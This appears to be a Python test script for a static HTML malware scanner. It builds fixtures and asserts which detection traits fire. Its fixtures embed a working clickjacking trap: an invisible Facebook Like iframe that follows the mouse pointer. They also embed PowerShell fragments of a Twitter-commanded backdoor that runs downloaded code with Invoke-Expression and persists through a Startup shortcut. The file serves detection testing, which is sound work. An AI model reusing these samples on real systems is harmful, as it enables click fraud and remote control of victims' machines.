#!/usr/bin/env python3
"""Scan HTML behavior controls statically; never run or render their contents."""

import argparse
import hashlib
import json
from pathlib import Path
import subprocess
import tempfile


OVERLAY = "objectives/impact/ui/manipulation/overlay::created-hidden-like-iframe-pointer-trap"
CLICK = "objectives/impact/ui/manipulation/social/clickjacking::"
TRAPS = {OVERLAY, CLICK + "pointer-following-like-iframe-self-removing",
         CLICK + "mousemove-tracked-like-iframe-self-removing"}
C2 = "objectives/command-and-control/remote-command/dispatch/social-media::"
BACKDOOR = C2 + "html-twitter-remote-command-backdoor"
PERSIST = "objectives/persistence/login/startup/shortcut::html-twitter-persistent-command-backdoor"
OPACITY = "micro-behaviors/ui/window/style::created-iframe-receiver-low-opacity"
WP = "micro-behaviors/communications/http/request/wordpress::wordpress-pages-rest-endpoint"
BAD = {"2bde2e70f7bd", "ea79ad8552a5"}


def html(script):
    return "<!doctype html><html><body><script>" + script + "</script></body></html>"


# These are source fixtures for static inspection, never invoked as JavaScript.
TRAP = """
var lbox = document.createElement('iframe');
lbox.src = 'https://www.facebook.com/plugins/like.php?href=example';
lbox.style.width = '53px'; lbox.style.height = '23px';
lbox.style.position = 'absolute'; lbox.style.opacity = 0;
document.body.appendChild(lbox);
window.addEventListener('mousemove', mouseMove, false);
setTimeout(function(){document.body.removeChild(lbox);}, 20000);
function mouseMove(e) {
var Xcord=e.pageX, Ycord=e.pageY;
lbox.style.top = (Ycord - 8) + 'px';
lbox.style.left = (Xcord - 25) + 'px';
}
"""

# Displayed PowerShell source, not browser-executed PowerShell.
COMMANDS = """
[xml] $Tweets = (New-Object Net.WebClient).downloadString('https://api.twitter.com/1/statuses/user_timeline.xml');
$BotCommand = $LatestTweet.split(' ')[0];
Switch($BotCommand) { '!downexec' { Invoke-Expression $downloaded } }
"""
INSTALL = r"""
$PersistencePath = 'C:\Users\Example\Start Menu\Programs\Startup\StartUp.lnk';
$Shortcut = $Wscript.CreateShortcut($PersistencePath);
$Shortcut.TargetPath = $RunPath;
$Shortcut.Save();
$FileOnDisk = 'C:\ProgramData\cache.db';
"""


def listing(source):
    return '<!doctype html><html><body><script type="application/json">' + json.dumps(
        {"rawLines": source.splitlines()}) + '</script></body></html>'


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="../cleave/target/release/cleave")
    parser.add_argument("--samples", type=Path)
    parser.add_argument("--manifest", type=Path,
                        help="Reviewed sample manifest, including relocated paths")
    args = parser.parse_args()
    repo = Path(__file__).resolve().parents[2]
    fixtures = {}

    def add(name, content, required=(), forbidden=(), benign=False):
        fixtures[name + ".html"] = (content.encode(), set(required), set(forbidden), benign)

    for name, script in {
        "trap": TRAP,
        "trap-renamed": TRAP.replace("lbox", "socialFrame").replace("Xcord", "x").replace("Ycord", "y"),
        "trap-fractional": TRAP.replace("opacity = 0;", "opacity = 0.02;"),
        "trap-quoted": TRAP.replace("opacity = 0;", 'opacity = "0";'),
        "trap-spaced": TRAP.replace("createElement('iframe')", 'createElement( "iframe" )'),
    }.items():
        add(name, html(script), TRAPS | {OPACITY})
    for opacity in ("1", "0.5", "0.1", "0.99", '"0.5"', "10"):
        add("visible-" + opacity.replace('"', 'q'), html(TRAP.replace("opacity = 0;", "opacity = " + opacity + ";")),
            forbidden=TRAPS | {OPACITY}, benign=True)
    add("visible-with-unrelated-css", '<style>.fade {opacity:0}</style>' + html(TRAP.replace("opacity = 0;", "opacity = 1;")),
        forbidden=TRAPS | {OPACITY}, benign=True)
    add("visible-with-other-dom-opacity", html(TRAP.replace("lbox.style.opacity = 0;", "lbox.style.opacity = 1; var hint=document.createElement('div'); hint.style.opacity = 0;")),
        forbidden=TRAPS | {OPACITY}, benign=True)
    add("visible-with-prefix-name-opacity", html(TRAP.replace("lbox.style.opacity = 0;", "lbox.style.opacity = 1; var lboxHint=document.createElement('div'); lboxHint.style.opacity = 0;")),
        forbidden=TRAPS | {OPACITY}, benign=True)
    no_pointer = TRAP[:TRAP.index("window.addEventListener")] + "setTimeout(function(){document.body.removeChild(lbox);},20000);"
    add("hidden-without-pointer", html(no_pointer), required={OPACITY}, forbidden=TRAPS, benign=True)
    add("hidden-without-removal", html(TRAP.replace("setTimeout(function(){document.body.removeChild(lbox);}, 20000);", "")),
        required={OPACITY, OVERLAY}, forbidden=TRAPS - {OVERLAY})
    add("ordinary-social-widget", html("var frame=document.createElement('iframe'); frame.src='https://www.facebook.com/plugins/like.php?href=example'; document.body.appendChild(frame);"), benign=True)
    add("twitter-startup", listing(COMMANDS + INSTALL), {BACKDOOR, PERSIST})
    add("twitter-renamed-files", listing((COMMANDS + INSTALL).replace("cache.db", "settings.dat").replace("StartUp.lnk", "Updater.lnk")), {BACKDOOR, PERSIST})
    add("twitter-renamed-variables", listing((COMMANDS + INSTALL).replace("$BotCommand", "$dispatch").replace("$LatestTweet", "$message")), {BACKDOOR, PERSIST})
    add("twitter-dispatch-whitespace", listing((COMMANDS + INSTALL).replace("Switch($BotCommand)", "Switch ( $BotCommand )")), {BACKDOOR, PERSIST})
    for name, install in {
        "no-startup": INSTALL.replace("Start Menu", "Documents"),
        "no-create": INSTALL.replace(".CreateShortcut", ".LookupShortcut"),
        "no-save": INSTALL.replace(".Save()", ".Inspect()"),
        "no-target": INSTALL.replace(".TargetPath", ".Description"),
    }.items():
        add(name, listing(COMMANDS + install), {BACKDOOR}, {PERSIST})
    add("filename-and-api-references", listing("cache.db StartUp.lnk https://api.twitter.com/1/statuses/user_timeline.xml"), benign=True)
    add("attack-discussion", "<html><body>A report discusses Meterpreter, Twitter bots and the !persist command.</body></html>", benign=True)
    add("ordinary-powershell-split", listing("$name = $line.split(' '); Switch($name) { 'help' { Write-Output 'usage' } }"), benign=True)
    add("ordinary-twitter-xml-client", listing(COMMANDS[:COMMANDS.index("Switch(")]), forbidden={BACKDOOR, PERSIST}, benign=True)
    add("wordpress-reference", '<html><a href="/wp-json/wp/v2/pages">API pages</a></html>', {WP}, benign=True)
    add("typography-wording", '<html><style>.white-text {color:white} .small-font {font-size:small}</style><p>Hidden text and concealed font are typography terms.</p></html>', benign=True)
    if args.samples:
        paths = sorted(p for p in args.samples.rglob("*") if p.is_file())
    else:
        paths = []
    if args.manifest:
        paths += [Path(s["current_path"]) for s in json.loads(args.manifest.read_text())["samples"]]
    seen = set()
    for path in paths:
        content = path.read_bytes()
        sha = hashlib.sha256(content).hexdigest()
        if sha in seen:
            continue
        seen.add(sha)
        required = ({BACKDOOR, PERSIST} if sha.startswith("2bde2e70f7bd") else
                    TRAPS if sha.startswith("ea79ad8552a5") else set())
        for name in (path.name, "unrelated.html"):
            fixtures["samples/" + sha[:12] + "/" + name] = (content, required, set(), sha[:12] not in BAD)

    with tempfile.TemporaryDirectory(prefix="html-triage-controls-") as directory:
        work = Path(directory)
        for name, (content, _, _, _) in fixtures.items():
            dest = work / name
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(content)
        result = subprocess.run([str((repo / args.cleave).resolve()), "--traits-dir", str(repo),
                                 "--all-files", "--format", "json", str(work)],
                                check=True, capture_output=True, text=True)
        assert "skipped trait file" not in result.stderr, result.stderr
        # JSON permits literal U+0085/U+2028/U+2029 in strings. splitlines()
        # would split legitimate HTML evidence containing those characters.
        reports = {str(Path(f["path"]).relative_to(work)): f
                   for line in result.stdout.split("\n") if line.strip()
                   for f in json.loads(line)["files"]}
        files = {name: f for name, f in reports.items() if name in fixtures}
        for name, f in reports.items():
            if name in fixtures:
                continue
            parent = name.split("##", 1)[0]
            assert parent in fixtures, ("unexpected analysis unit", name)
            if fixtures[parent][3]:
                assert not [t for t in f.get("traits", []) if t["crit"] >= 4], name
        assert set(files) == set(fixtures), (set(fixtures) - set(files), set(files) - set(fixtures))
        for name, (_, required, forbidden, benign) in fixtures.items():
            f = files[name]
            traits = f.get("traits", [])
            ids = {t["id"] for t in traits}
            assert required <= ids, (name, "missing", required - ids)
            assert not forbidden & ids, (name, "unexpected", forbidden & ids)
            elevated = [t["id"] for t in traits if t["crit"] >= 4]
            if benign:
                assert not elevated, (name, elevated)
            if name.startswith("samples/") and not benign:
                directories = {t["id"].split("::")[0] for t in traits if t["crit"] == 5}
                assert len(directories) >= 2, (name, directories)
            assert not any(t.startswith("objectives/execution/exploit/chain/web-application::wordpress-pages-rest-endpoint") for t in ids), name
            assert not any(t.endswith(("::llm-doc-hidden-style", "::llm-doc-white-style")) for t in ids), name
        print(f"PASS: {len(fixtures)} HTML controls, including {len(seen)} reviewed samples in original and renamed paths")


if __name__ == "__main__":
    main()
